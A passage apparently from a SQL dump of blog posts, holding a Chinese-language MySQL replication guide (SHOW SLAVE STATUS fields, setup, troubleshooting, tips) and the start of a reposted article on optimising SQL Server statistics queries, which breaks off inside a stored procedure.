Master_Log_File</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>I/O线程当前正在读取的主服务器二进制日志文件的名称。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Read_Master_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在当前的主服务器二进制日志中，I/O线程已经读取的位置。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Relay_Log_File</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>SQL线程当前正在读取和执行的中继日志文件的名称。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Relay_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在当前的中继日志中，SQL线程已读取和执行的位置。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Relay_Master_Log_File</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>由SQL线程执行的包含多数近期事件的主服务器二进制日志文件的名称。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Slave_IO_Running</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>I/O线程是否被启动并成功地连接到主服务器上。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Slave_SQL_Running</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>SQL线程是否被启动。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Replicate_Do_DB,Replicate_Ignore_DB</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>使用&ndash;replicate-do-db和&ndash;replicate-ignore-db选项指定的数据库清单。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Replicate_Do_Table,Replicate_Ignore_Table,Replicate_Wild_Do_Table,Replicate_Wild_Ignore_Table</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>使用&ndash;replicate-do-table,&ndash;replicate-ignore-table,&ndash;replicate-wild-do-table和&ndash;replicate-wild-ignore_table选项指定的表清单。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Last_Errno,Last_Error</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>被多数最近被执行的查询返回的错误数量和错误消息。错误数量为0并且消息为空字符串意味着&ldquo;没有错误&rdquo;。如果Last_Error值不是空值，它也会在从属服务器的错误日志中作为消息显示。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>举例说明：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Last_Errno: 1051</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Last_Error: error &lsquo;Unknown table &lsquo;z&rdquo; on query &lsquo;drop table z&rsquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>该消息指示，表z曾经存在于在主服务器中并已被取消了，但是它没有在从属服务器中存在过，因此对于从属服务器，DROP TABLE失败。（举例说明，在设置复制时，如果您忘记了把此表拷贝到从属服务器中，则这有可能发生。）</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Skip_Counter</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>最近被使用的用于SQL_SLAVE_SKIP_COUNTER的值。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Exec_Master_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>来自主服务器的二进制日志的由SQL线程执行的上一个时间的位置（Relay_Master_Log_File）。在主服务器的二进制日志中的(Relay_Master_Log_File, Exec_Master_Log_Pos)对应于在中继日志中的(Relay_Log_File,Relay_Log_Pos)。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Relay_Log_Space</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>所有原有的中继日志结合起来的总大小。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Until_Condition,Until_Log_File,Until_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在START SLAVE语句的UNTIL子句中指定的值。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Until_Condition具有以下值：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果没有指定UNTIL子句，则没有值</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果从属服务器正在读取，直到达到主服务器的二进制日志的给定位置为止，则值为Master</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果从属服务器正在读取，直到达到其中继日志的给定位置为止，则值为Relay</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Until_Log_File和Until_Log_Pos用于指示日志文件名和位置值。日志文件名和位置值定义了SQL线程在哪个点中止执行。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Master_SSL_Allowed,Master_SSL_CA_File,Master_SSL_CA_Path,Master_SSL_Cert,Master_SSL_Cipher,Master_SSL_Key</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>这些字段显示了被从属服务器使用的参数。这些参数用于连接主服务器。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Master_SSL_Allowed具有以下值：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果允许对主服务器进行SSL连接，则值为Yes</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果不允许对主服务器进行SSL连接，则值为No</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>o 如果允许SSL连接，但是从属服务器没有让SSL支持被启用，则值为Ignored。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>与SSL有关的字段的值对应于&ndash;master-ca,&ndash;master-capath,&ndash;master-cert,&ndash;master-cipher和&ndash;master-key选项的值。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Seconds_Behind_Master</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>本字段是从属服务器&ldquo;落后&rdquo;多少的一个指示。当从属SQL线程正在运行时（处理更新），本字段为在主服务器上由此线程执行的最近的一个事件的时间标记开始，已经过的秒数。当此线程被从属服务器I/O线程赶上，并进入闲置状态，等待来自I/O线程的更多的事件时，本字段为零。总之，本字段测量从属服务器SQL线程和从属服务器I/O线程之间的时间差距，单位以秒计。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果主服务器和从属服务器之间的网络连接较快，则从属服务器I/O线程会非常接近主服务器，所以本字段能够十分近似地指示，从属服务器SQL线程比主服务器落后多少。如果网络较慢，则这种指示不准确；从属SQL线程经常会赶上读取速度较慢地从属服务器I/O线程，因此，Seconds_Behind_Master经常显示值为0。即使I/O线程落后于主服务器时，也是如此。换句话说，本列只对速度快的网络有用。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>即使主服务器和从属服务器不具有相同的时钟，时间差计算也会起作用（当从属服务器I/O线程启动时，计算时间差。并假定从此时以后，时间差保持不变）。如果从属SQL线程不运行，或者如果从属服务器I/O线程不运行或未与主服务器连接，则 Seconds_Behind_Master为NULL（意义为&ldquo;未知&rdquo;）。举例说明，如果在重新连接之前，从属服务器I/O线程休眠了master- connect-retry秒，则显示NULL，因为从属服务器不知道主服务器正在做什么，也不能有把握地说落后多少</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MySQL复制的概述、安装、故障、技巧、工具</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>同MongoDB，Redis这样的NoSQL数据库的复制相比，MySQL复制显得相当复杂！接下来就是详细的介绍，相信下文中的内容对大家掌握MySQL数据库的复制是非常有帮助的。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>概述</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>首先主服务器把数据变化记录到主日志，然后从服务器通过I/O线程读取主服务器上的主日志，并且把它写入到从服务器的中继日志中，接着SQL线程读取中继日志，并且在从服务器上重放，从而实现MySQL复制。具体如下图所示：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MySQL复制</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>整个过程反映到从服务器上，对应三套日志信息，可在从服务器上用如下命令查看：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SHOW SLAVE STATUS;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Master_Log_File &amp; Read_Master_Log_Pos：下一个传输的主日志信息。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Relay_Master_Log_File &amp; Exec_Master_Log_Pos：下一个执行的主日志信息。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Relay_Log_File &amp; Relay_Log_Pos：下一个执行的中继日志信息。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>理解这些日志信息的含义对于解决故障至关重要，后文会详细阐述。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>安装</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>先在主服务器上创建复制账号：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; GRANT REPLICATION SLAVE ON *.*</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>TO &#39;&lt;SLAVE_USER&gt;&#39;@&#39;&lt;SLAVE_HOST&gt;&#39;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>IDENTIFIED BY &#39;&lt;SLAVE_PASSWORD&gt;&#39;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：出于安全性和灵活性的考虑，不要把root等具有SUPER权限用户作为复制账号。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>然后设置主服务器配置文件（缺省：/etc/my.cnf）：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>server_id = 100</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>log_bin = mysql-bin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>log_bin_index = mysql-bin.index</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>sync_binlog = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>innodb_flush_log_at_trx_commit = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>innodb_support_xa = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：一定要保证主从服务器各自的server_id唯一，避免冲突。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：如果没有指定log_bin的话，缺省会使用主机名作为名字，如此一来一旦主机名发生改变，就会出问题，所以推荐指定log_bin（从服务器的relay_log存在一样的问题）。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：sync_binlog，innodb_flush_log_at_trx_commit，innodb_support_xa三个选项都是出于安全目的设置的，不是复制的必须选项。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>接着设置从服务器配置文件（缺省：/etc/my.cnf）：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>server_id = 200</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>log_bin = mysql-bin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>log_bin_index = mysql-bin.index</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>relay_log = mysql-relay-bin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>relay_log_index = mysql-relay-bin.index</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>read_only = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>skip_slave_start = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>log_slave_updates = 1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：如果用户有SUPER权限，则read_only无效。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：有了skip_slave_start，除非使用START SLAVE命令，否则从服务器不会开始复制。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：设置log_slave_updates，让从服务器记录日志，有助于在必要时把从切换成主。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下面最重要的步骤是如何克隆一份主服务器的数据：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果数据库使用的是MyISAM表类型的话，可按如下方式操作：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>shell&gt; mysqldump --all-databases --master-data=1 &gt; data.sql</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：master-data选项缺省会打开lock-all-tables，并写入CHANGE MASTER TO语句。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果数据库使用的是InnoDB表类型的话，则应该使用single-transcation：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>shell&gt; mysqldump --all-databases --single-transaction --master-data=1 &gt; data.sql</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>有了数据文件，传输到从服务器上并导入：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>shell&gt; mysql &lt; data.sql</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果数据量很大的话，mysqldump会非常慢，此时直接拷贝数据文件能节省不少时间：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在拷贝之前要先锁定数据，然后再获得相关的日志信息（FILE &amp; POSITION）：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; FLUSH TABLES WITH READ LOCK;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SHOW MASTER STATUS;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>接下来拷贝数据文件时，如果是MyISAM表类型的话，直接拷贝即可；如果是InnoDB表类型的话，一定要先停止MySQL服务再拷贝，否则拷贝文件可能无法使用。把拷贝的数据文件直接复制到从服务器的数据目录。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>最后还需要再指定一下日志信息：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; CHANGE MASTER TO</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_HOST=&#39;&lt;MASTER_HOST&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_USER=&#39;&lt;SLAVE_USER&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_PASSWORD=&#39;&lt;SLAVE_PASSWORD&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_FILE=&#39;&lt;FILE&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_POS=&lt;POSITION&gt;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：不要在my.cnf配置文件里设置MASTER_USER和MASTER_PASSWORD，因为最终生效的是CHANGE MASTER TO生成的master.info文件里的信息。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在主服务器上直接拷贝数据文件虽然很快，但需要锁表或者停止服务，这会影响线上服务。如果先前已经有了从服务器，那么可以用旧的从服务器做母本来克隆新的从服务器：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>先在旧的从服务器上查询日志信息：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SHOW SLAVE STATUS;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我们需要的是其中的Relay_Master_Log_File &amp; Exec_Master_Log_Pos。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>然后在旧的从服务器上按照前面的方法得到数据，并在新的从服务器上还原。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>接着在新的从服务器上设置日志信息：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; CHANGE MASTER TO</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_HOST=&#39;&lt;MASTER_HOST&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_USER=&#39;&lt;SLAVE_USER&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_PASSWORD=&#39;&lt;SLAVE_PASSWORD&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_FILE=&#39;&lt;Relay_Master_Log_File&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_POS=&lt;Exec_Master_Log_Pos&gt;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>不管用那个方法，最后记得在从服务器上启动复制，并检查工作是否正常：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; START SLAVE;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SHOW SLAVE STATUS;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果IO线程和SQL线程都显示Yes，就可以感谢上帝了：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Slave_IO_Running 对应：Master_Log_File &amp; Read_Master_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Slave_SQL_Running 对应：Relay_Master_Log_File &amp; Exec_Master_Log_Pos</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果显示No，则说明前面某些配置步骤出错，或者对应的日志文件有问题。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>故障</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>问题：主从复制不止何故停止了，我该怎么办？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>答案：复制错误多半是因为日志错误引起的，所以首先要搞清楚是主日志错误还是中继日志错误，从错误信息里一般就能判断，如果不能可以使用类似下面的mysqlbinlog命令：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>shell&gt; mysqlbinlog &lt;MASTER_BINLOG_FILE&gt; &gt; /dev/null</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>shell&gt; mysqlbinlog &lt;SLAVE_BINLOG_FILE&gt; &gt; /dev/null</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果没有错误，则不会有任何输出，反之如果有错误，则会显示出来。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果是主日志错误，则需要在从服务器使用SET GLOBAL sql_slave_skip_counter，如下：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SET GLOBAL sql_slave_skip_counter = 1;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; START SLAVE;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注：如果有多个错误，可能需要执行多次（提醒：主从服务器数据可能因此不一致）。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果是中继日志错误，只要在从服务器使用SHOW SLAVE STATUS结果中的日志信息重新CHANGE MASTER TO即可，系统会抛弃当前的中继日志，重新下载：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; CHANGE MASTER TO</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_FILE=&#39;&lt;Relay_Master_Log_File&gt;&#39;,</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MASTER_LOG_POS=&lt;Exec_Master_Log_Pos&gt;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; START SLAVE;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>至于为什么使用的是Relay_Master_Log_File &amp; Exec_Master_Log_Pos，参见概述。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>问题：主服务器宕机了，如何把从服务器提升会主服务器？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>答案：在一主多从的环境总，需选择数据最新的从服务器做新的主服务器。如下图所示：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>提升从服务器为主服务器</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在一主（Server1）两从（Server2，、Server3）的环境中，Server1宕机后，等到Server1和Server2把宕机前同步到的日志都执行完，比较Master_Log_File和Read_Master_Log_Pos就可以判断出谁快谁慢，因为Server2从 Server1同步的数据（1582）比Server3从Server1同步的数据（1493）新，所以应该提升Server2为新的主服务器，那么 Server3在CHANGE MASTER TO到Server2的时候应该使用什么样的参数呢？1582-1493=89，而Server2的最后的二进制日志位置是8167，所以答案是 8167-89=8078。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>技巧</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>主从服务器中的表可以使用不同的表类型。比如主服务器可以使用InnoDB表类型，提供事务，行锁等高级特性，从服务器可以使用MyISAM表类型，内存消耗少，易备份等优点。还有一个例子，一台主服务器如果同时带很多个从服务器的话，势必会影响其性能，此时可以拿出一台服务器作为从服务器代理，使用BLACKHOLE表类型，只记录日志，不写数据，由它带多台从服务器，从而提升性能。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>主从服务器中的表可以使用不同的键类型。比如主服务器用InnoDB，键用VARCHAR的话节省空间，从服务器使用MyISAM，键用CHAR提高速度，因为MyISAM有静态表一说。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>主从服务器中的表可以使用不同的索引。主服务器主要用来应付写操作，所以除了主键和唯一索引等保证数据关系的索引一般都可以不加，从服务器一般用来应付读操作，所以可以针对查询特征设置索引，再进一步，不同的从服务器可以针对不同的查询设置不同的索引。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>工具</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>有一些优秀的工具可以让你的复制工作得到事半功倍的效果，详细内容请参考各自文档：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Multi-Master Replication Manager for MySQL</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Percona XtraBackup</p>\r\n',0,1438008674,0,0),(94,39,'SQL Server大数据量统计系统的经验总结[转]','<p>项目介绍<br />\r\n政府一个业务系统，<br />\r\n使用范围全国<br />\r\n数据是区域还存储,最大地方,主业务表，一年有600万,工作流表，1年有几千万,迄今为至系统已经运行三年。<br />\r\n其它全国还有46个地点,数据也比较多<br />\r\n新开发系统主要功能,对业务系统的数据进行分析统计.</p>\r\n\r\n<p><br />\r\n所以对性能要求比较高。</p>\r\n\r\n<p>我们的简要方案。</p>\r\n\r\n<p>建立中间表，通过DTS调度每天共步数据。<br />\r\n中间表设计原则<br />\r\n&nbsp;记录数同原表一样，减少多表连接，保存运算好的值，如果记录修改，根据修改日志，重新计算中间值</p>\r\n\r\n<p><br />\r\n增量同步数据(DTS)<br />\r\n&nbsp;直接从每天的数据库更改日志读取记录，更新中间表，根据服务器空间程度合理调度DTS，减少数据同步时间。</p>\r\n\r\n<p>对中间数据进行运算<br />\r\n&nbsp;查询不作字段运行，所以运算在生成中间表的过程中已经计算</p>\r\n\r\n<p>根据查询,优化索引设计<br />\r\n&nbsp;根据数据查询特性，对where ，GROUP BY等操作字段进行索引设计，提高查询速度 &nbsp;</p>\r\n\r\n<p>&nbsp;优化数据类型<br />\r\n&nbsp;大量采用Int提高查询、统计速度 &nbsp;</p>\r\n\r\n<p>&nbsp;优化中间表关键字<br />\r\n&nbsp;采用Int，提高插入速度</p>\r\n\r\n<p>数据文件优化设计，一个主要业务，一个数据文件，建数据文件时，估计数据量，一次建一个比较大的文件，这样所分配的文件就是一个连续文件块，</p>\r\n\r\n<p>sql server设置区别大小写。初始内存调到一个比较大的内存。</p>\r\n\r\n<p>使用我们的Toolkit开发简单分页，相关压力测试，<br />\r\n&nbsp;测试服务器配制<br />\r\n&nbsp;2个至强3.0CPU<br />\r\n&nbsp;2G内存<br />\r\n&nbsp;150G硬盘<br />\r\n&nbsp;Window 2000 Advance Server中文版+SP4<br />\r\n&nbsp;测试数据ENTRY_WORKFLOW表，数据量2,473,437</p>\r\n\r\n<p><br />\r\n&nbsp;页数&nbsp; 界面显示时间&nbsp; CPU&nbsp; Reads I/O&nbsp; Writes I/O&nbsp; Duration<br />\r\n&nbsp;第1页&nbsp; 2-3 S&nbsp; 642&nbsp; 10689&nbsp; 0 390<br />\r\n&nbsp;第100页&nbsp; 3-4S&nbsp; 626&nbsp; 128001&nbsp; 0 423<br />\r\n&nbsp; &nbsp;<br />\r\n&nbsp;....后页业数太多，没有必要</p>\r\n\r\n<p><br />\r\n&nbsp;压力测试</p>\r\n\r\n<p>&nbsp;并发数 平均每秒请求数 未字节响应毫秒数<br />\r\n&nbsp;50 45.28 20,095.65<br />\r\n&nbsp;25 45.41 10,043.12</p>\r\n\r\n<p>索引优化测试， &nbsp;</p>\r\n\r\n<p>&nbsp;对分量值小的数据建索引测试，测试语句，GROUP BY 分量值<br />\r\n&nbsp; 一个字段,大概有6个分量值,没有建索引,4S,建索引&lt;1s<br />\r\n&nbsp;两个分量,不建索引,3S,建索引,&lt;1S<br />\r\n一般来说，对分量小的字段，不建索引，但是我们对性能要求太高，根据我们的测试，数据对分量范围小的也要建索引。</p>\r\n\r\n<p>因为一个统计，有一个很多组合的WHERE，比如有十个指标这样会有十次访问原表，这样性能太低，所以我们把where后的数据作</p>\r\n\r\n<p><br />\r\n用中间数据，<br />\r\n十个指标对中间数据作查询，中间数据，我们使用临时表，<br />\r\n经测试，10万条记录，插入操作，临时表需要，16s,表变量需要，40S</p>\r\n\r\n<p>select ... into #temp from .......<br />\r\n速度极快，2，500，000条记录，16S</p>\r\n\r\n<p>一个存储过程样例，有兴趣可以分析一下！</p>\r\n\r\n<p>&nbsp;1SET QUOTED_IDENTIFIER ON &nbsp;</p>\r\n\r\n<p>&nbsp; 2GO</p>\r\n\r\n<p>&nbsp; 3SET ANSI_NULLS ON &nbsp;</p>\r\n\r\n<p>&nbsp; 4GO</p>\r\n\r\n<p>&nbsp; 5</p>\r\n\r\n<p>&nbsp; 6</p>\r\n\r\n<p>&nbsp; 7</p>\r\n\r\n<p>&nbsp; 8</p>\r\n\r\n<p>&nbsp; 9</p>\r\n\r\n<p>&nbsp;10ALTER&nbsp;&nbsp;&nbsp;&nbsp; Procedure sp_tg009</p>\r\n\r\n<p>&nbsp;11&nbsp;&nbsp;&nbsp; /* Param List */</p>\r\n\r\n<p>&nbsp;12&nbsp;&nbsp;&nbsp; @TE_I_E_FLAG varchar(4),/*进出口方式*/</p>\r\n\r\n<p>&nbsp;13&nbsp;&nbsp;&nbsp; @TE_PASS_RANGE varchar(4),/*关区范围*/</p>\r\n\r\n<p>&nbsp;14&nbsp;&nbsp;&nbsp; @TE_C_OUTPUT varchar(4),/*输出方式退单理由输出、申报单位输出、全部输出*/</p>\r\n\r\n<p>&nbsp;15&nbsp;&nbsp;&nbsp; @TE_END_DATE datetime,/**********申报起止日期********/</p>\r\n\r\n<p>&nbsp;16&nbsp;&nbsp;&nbsp; @TE_END_DATEEND datetime,/*************************/</p>\r\n\r\n<p>&nbsp;17&nbsp;&nbsp;&nbsp; @TE_MONI_T varchar(4),/*监控类型*/</p>\r\n\r\n<p>&nbsp;18&nbsp;&nbsp;&nbsp; @USER_ID varchar(64),</p>\r\n\r\n<p>&nbsp;19&nbsp;&nbsp;&nbsp; @CUSTOMER_CODE varchar(4),</p>\r\n\r\n<p>&nbsp;20&nbsp;&nbsp;&nbsp; @PAGE_NUMBER int,</p>\r\n\r\n<p>&nbsp;21&nbsp;&nbsp;&nbsp; @TOTAL_COUNT int OUTPUT</p>\r\n\r\n<p>&nbsp;22AS</p>\r\n\r\n<p>&nbsp;23</p>\r\n\r\n<p>&nbsp;24/******************************************************************************</p>\r\n\r\n<p>&nbsp;25**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File: &nbsp;</p>\r\n\r\n<p>&nbsp;26**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name: sp_tg009</p>\r\n\r\n<p>&nbsp;27**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Desc: 通关业务监控－通关规范监控－报关单退（拒）单管理</p>\r\n\r\n<p>&nbsp;28**</p>\r\n\r\n<p>&nbsp;29**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This template can be customized:</p>\r\n\r\n<p>&nbsp;30**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;31**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Return values:</p>\r\n\r\n<p>&nbsp;32** &nbsp;</p>\r\n\r\n<p>&nbsp;33**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Called by: &nbsp;</p>\r\n\r\n<p>&nbsp;34**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;35**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Parameters:</p>\r\n\r\n<p>&nbsp;36**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 